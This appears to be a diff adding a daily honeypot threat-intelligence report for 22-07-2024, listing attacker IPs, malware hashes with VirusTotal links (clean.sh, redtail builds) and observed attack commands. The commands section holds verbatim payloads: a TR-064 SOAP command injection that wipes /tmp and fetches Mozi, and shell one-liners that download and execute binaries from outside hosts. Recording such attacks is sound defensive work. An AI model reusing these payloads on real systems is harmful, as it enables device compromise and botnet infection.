@@ -1,0 +1,41 @@
+Top 5 IPs for 22-07-2024 :
+
+121.229.42.32
+185.22.65.186
+208.48.253.178
+91.231.202.86
+121.135.177.177
+
+Malware Observed:
+
+File name : clean.sh
+d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+https://www.virustotal.com/gui/file/d46555af1173d22f07c37ef9c1e0e74fd68db022f2b6fb3ab5388d2c5bc6a98e
+
+File name : redtail.arm7
+28dc11bfe01f303a15c73150a9a7cdfda39828722c8ecb698147f78c500140a6
+https://www.virustotal.com/gui/file/28dc11bfe01f303a15c73150a9a7cdfda39828722c8ecb698147f78c500140a6
+
+File name : redtail.arm8
+66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+https://www.virustotal.com/gui/file/66354c8878ca935f0fc6e3623e190e8a400318ded4c8d3d7baa85873059bc179
+
+File name : redtail.i686
+929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+https://www.virustotal.com/gui/file/929efd52db47fe4723fb8532104b612f82414bc2c48639cfbf1dac69378f76fd
+
+File name : redtail.x86_64
+17229e1940e272030b079915600ea9fd944b8250680d89e1ee1eca42bbe3772f
+https://www.virustotal.com/gui/file/17229e1940e272030b079915600ea9fd944b8250680d89e1ee1eca42bbe3772f
+
+
+Commands/exploits observed:
+
+<?xml version="1.0"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><SOAP-ENV:Body><u:SetNTPServers xmlns:u="urn:dslforum-org:service:Time:1&qu ot;><NewNTPServer1>`cd /tmp && rm -rf * && /bin/busybox wget http://192.168.1.1:8088/Mozi.m && chmod 777 /tmp/tr064 && /tmp/tr064 tr064`</NewNTPServer1><NewNTPServer2>`echo DEATH`</NewNTPServer2><NewNTPServer3>`echo DEATH`</NewNTPServer3><NewNTPServer4>`echo DEATH`</NewNTPServer4><NewNTPServer5>`echo DEATH`</NewNTPServer5></u:SetNTPServers></SOAP-ENV:Body></SOAP-ENV:Envelope>
+
+
+
+cd /data/local/tmp/; busybox wget http://192.3.1.113/w.sh; sh w.sh; curl http://192.3.1.113/c.sh; sh c.sh
+
+
+nohup $SHELL -c "curl http://171.214.3.212:60125/arm_linux -o /tmp/9ePAubBdDJ; if [ ! -f /tmp/9ePAubBdDJ ]; then wget http://171.214.3.212:60125/arm_linux -O /tmp/9ePAubBdDJ; fi; if [ ! -f /tmp/9ePAubBdDJ ]; then exec 6<>/dev/tcp/171.214.3.212/60125 && echo -n 'GET /arm_linux' >&6 && cat 0<&6 > /tmp/9ePAubBdDJ && chmod +x /tmp/9ePAubBdDJ && /tmp/9ePAubBdDJ dn8dOzKbhD89Am4DC3EePzGDhTo5G38DFW0dPiWHhzsnHWYMAWkcOD+BlToxHnEKDm4CMCWGjDE/HG4LC38dOTqbjDonHW8MFW4ePjGDhTo6H38DFW0dMSWEgjgnFGcBDW8dOD6VjSU7HWcVCmsfJzqFhjE/HG4PDH8dOzubgjonHnENCmUaOTqFhSs4FG0VCmodJziMmzo8GmUNC24dMSuGgyU7GnEDCXEeOzOPgzs4HW0bCmgdJzmEgSU6Am0KCWUaOTqHgCs6FXEKDWoCOD+CmzIxFmkLCm0ZKTqFgyU4HmsVCmsfJz+Mjz05HW8MG24UOyWEgDonGGsVCWoZMz2FhD85DGcVCW4cJzKBmzk4GWUNC24YPCuEhT0nGWcVCW4ZJzKDjz05HW0PG2kcJzqNjSU7GGoVCmcZMz2FhD84DGcVCW4bJzqDhSU4HW4BDW8dOj6VgzonHWkLFW0dOiWHhjIzGm8KC24MPTKbjT8nHm4IFW4VMz2FhD8xDG4JC3EZPCWMgCU4GmUNC24YOCuBgiU7H2cVCW8YJzOMjz05HW4KG24dPiWGhiU4G2gVA2cWPzuEhTkpFHEJCW0CODyFmzgxFmkLCm4eKTmbgDInHWcJFW4VPjGDhTo6FX8KC2kCODmBmzo9H3EPAmUaOTqFgisxAm0KAnEdPDqbhz45FmkLCm4eKTqHhSU+HXEJFWkdMz2FhDs5DG4KA3EdOzqbgDMnHmsJAWkcODuHlTo5GnEOA3EeOD6bjD0zGm8KCWsMODOHmzo8HXECFWwVMz2FhDs5FrxKobKZLLmoZuMtBAg=; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/9ePAubBdDJ && /tmp/9ePAubBdDJ dn8dOzKbhD89Am4DC3EePzGDhTo5G38DFW0dPiWHhzsnHWYMAWkcOD+BlToxHnEKDm4CMCWGjDE/HG4LC38dOTqbjDonHW8MFW4ePjGDhTo6H38DFW0dMSWEgjgnFGcBDW8dOD6VjSU7HWcVCmsfJzqFhjE/HG4PDH8dOzubgjonHnENCmUaOTqFhSs4FG0VCmodJziMmzo8GmUNC24dMSuGgyU7GnEDCXEeOzOPgzs4HW0bCmgdJzmEgSU6Am0KCWUaOTqHgCs6FXEKDWoCOD+CmzIxFmkLCm0ZKTqFgyU4HmsVCmsfJz+Mjz05HW8MG24UOyWEgDonGGsVCWoZMz2FhD85DGcVCW4cJzKBmzk4GWUNC24YPCuEhT0nGWcVCW4ZJzKDjz05HW0PG2kcJzqNjSU7GGoVCmcZMz2FhD84DGcVCW4bJzqDhSU4HW4BDW8dOj6VgzonHWkLFW0dOiWHhjIzGm8KC24MPTKbjT8nHm4IFW4VMz2FhD8xDG4JC3EZPCWMgCU4GmUNC24YOCuBgiU7H2cVCW8YJzOMjz05HW4KG24dPiWGhiU4G2gVA2cWPzuEhTkpFHEJCW0CODyFmzgxFmkLCm4eKTmbgDInHWcJFW4VPjGDhTo6FX8KC2kCODmBmzo9H3EPAmUaOTqFgisxAm0KAnEdPDqbhz45FmkLCm4eKTqHhSU+HXEJFWkdMz2FhDs5DG4KA3EdOzqbgDMnHmsJAWkcODuHlTo5GnEOA3EeOD6bjD0zGm8KCWsMODOHmzo8HXECFWwVMz2FhDs5FrxKobKZLLmoZuMtBAg=" &
